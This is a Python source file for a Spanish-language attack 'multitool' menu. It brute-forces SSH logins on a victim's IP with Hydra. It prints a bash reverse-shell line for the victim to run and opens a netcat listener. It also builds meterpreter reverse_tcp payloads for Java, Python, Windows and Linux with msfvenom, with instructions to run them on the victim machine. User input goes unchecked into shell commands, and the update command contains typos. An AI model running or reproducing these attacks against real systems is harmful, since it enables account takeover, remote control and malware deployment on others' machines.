from colorama import Fore, Back
import os, socket, sys

name = socket.gethostname()
ip= socket.gethostbyname(name)

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

def hydra_attack():
      options = '''
[00]: Volver al menú.
[01]: Salir.
[02]: Ataque ssh.
'''
      print('\n' + options)
      choice = input('[#]> ')

      if choice == '00':
            menu()

      elif choice == '01':
            print(Fore.RESET + Back.RESET)
            os.system('clear')
            sys.exit()
      
      elif choice == '02':
            print('\n[#] El diccionario tiene que estar en tu directorio actual.')
            print('[#] Ingresa la IP de la víctima.')
            choice = input('[#]> ')
            print('\n' + '[#] Ingresa el nombre de usuario de la víctima.')
            choice2 = input('[#]> ')
            print('\n' + '[#] Ingresa el nombre del diccionario.')
            choice3 = input('[#]> ')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            os.system(f'hydra -l {choice2} -P {choice3} -e nsr -t 8 ssh://{choice}/ -V -f')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            print('\n[#] Presiona ENTER para volver al menú.')
            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
            menu()


      else:
            print('\n[#] Error: Command not found :(. Presiona ENTER para volver al menú.')
            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
            menu()

def menu():
      os.system('clear')
      title = f'''
                /%&@.           [#] Aliado de Guerra (Kriegsverbündeter).                      
                (.%(#           [#] Usar siempre con responsabilidad y de acuerdo            
               #..&&#&          con la licencia (https://github.com/ZombieGeeK0/MultiTool/blob/main/LICENSE.md).
               #.,&&(@                                    
               #./&&#%          [#] Esta es una herramienta multifunciones creada por ZombieGeek0.
              #*.(&&##%          
              %*,(#%#%&         [#] Ip: {ip}.                        
              ,  /##*/%         [#] Nombre de la máquina: {name}                         
              ,  /##*/%                                   
              ,  /##//%         [00]: Salir.                          
             ,,  ,/(,*/#        [01]: Volver al menú.                          
            *,   (##%///#       [02]: Generar una wordlist con crunch (de palabras).                     
            *,   (##%//(#       [03]: Poner al día todos los paquetes.                          
            *,   ###%//(#       [04]: Hacerle un Whois a un dominio o a una IP.                          
            *,  .#%#%//(#       [05]: Crear una pequeña reverse shell con Bash para Linux                          
            *,  .#%%%//(#       [06]: Generar payloads con msfvenom.                          
            *,  .#%%%//(#       [07]: Realizar ataques con Hydra.                          
            *,  .#%%%//(#                                 
            *, ..#%%%//(#                                 
            *. ..#%%%/((#                                 
            /. ..#%%%/((#                                 
            /. ..##%%(((#                                 
            /,..,##%%(((#                                 
            /,..,##%%(((#                                 
            /...,(#%%(((#                                 
            /...,##%%((##                                 
            /,..,##%%(#(#                                 
            (((/(#%%#%%&&                                 
            .,.../##/(#%(                                                      
      '''
      print(Fore.YELLOW + Back.RESET + title)

      choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')

      if choice == '00':
            print(Fore.RESET + Back.RESET)
            os.system('clear')
            sys.exit()

      elif choice == '01':
            menu()

      elif choice == '02':
            print(Fore.YELLOW + Back.RESET + '\n[#] Ingresa la cantidad mínima de caracteres: ')
            choice = input(Fore.YELLOW + Back.RESET + '[#]> ')
            print(Fore.YELLOW + Back.RESET + '\n[#] Ingresa la cantidad máxima de caracteres: ')
            choice2 = input(Fore.YELLOW + Back.RESET + '[#]> ')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            os.system(f'crunch {choice} {choice2}')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            print('\n[#] Presiona ENTER para volver al menú.')
            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
            menu()

      elif choice == '03':
            print('\n[#] En proceso...')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            os.system('sudo apt update && sudo dist-upgrade -y && sudo apt autoremove .y && sudo apt update && sudo apt -y upgrade && sudo apt -y full-upgrade && sudo apt dist-upgrade')
            os.system("alias fullupgrade='sudo apt update && sudo dist-upgrade -y && sudo apt autoremove .y && sudo apt update && sudo apt -y upgrade && sudo apt -y full-upgrade && sudo apt dist-upgrade'")
            print('[#]> ------------------------------------------------------------------------- <[#]')
            print('[#] A partir de ahora, usa el comando fullupgrade para actualizarlo todo.')
            print('\n[#] Presiona ENTER para volver al menú.')
            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
            menu()

      elif choice == '04':
            print('\n[#] Ingresa el nombre de dominio o la IP.')
            choice = input('[#]> ')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            os.system(f'whois {choice}')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            print('\n[#] Presiona ENTER para volver al menú.')
            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
            menu()

      elif choice == '05':
            print('\n[#] Comando a ejecutar en la víctima: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            os.system('nc -lvp 8080')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            print('\n[#] Presiona ENTER para volver al menú.')
            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
            menu()

      elif choice == '06':
            print('\n[#] Ingresa tu IP: ')
            choice = input('[#]> ')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            os.system(f'msfvenom -p java/meterpreter/reverse_tcp LHOST={choice} LPORT=4444 -f jar > payload_java.jar')
            os.system(f'msfvenom -p python/meterpreter/reverse_tcp LHOST={choice} LPORT=4444 -o payload_python.py')
            os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={choice} LPORT=4444 -o payload_windows.exe')
            os.system(f'msfvenom -p linux/meterpreter/reverse_tcp LHOST={choice} LPORT=4444 -o payload_linux.exe')
            print('[#]> ------------------------------------------------------------------------- <[#]')
            print('[#] Ejecuta el archivo en la máquina víctima.')
            os.system('nc -lvnp 4444')
            print('\n[#] Presiona ENTER para volver al menú.')
            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
            menu()

      elif choice == '07':
            hydra_attack()
      

      else:
            print('\n[#] Error: Command not found :(. Presiona ENTER para volver al menú.')
            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
            menu()

menu()
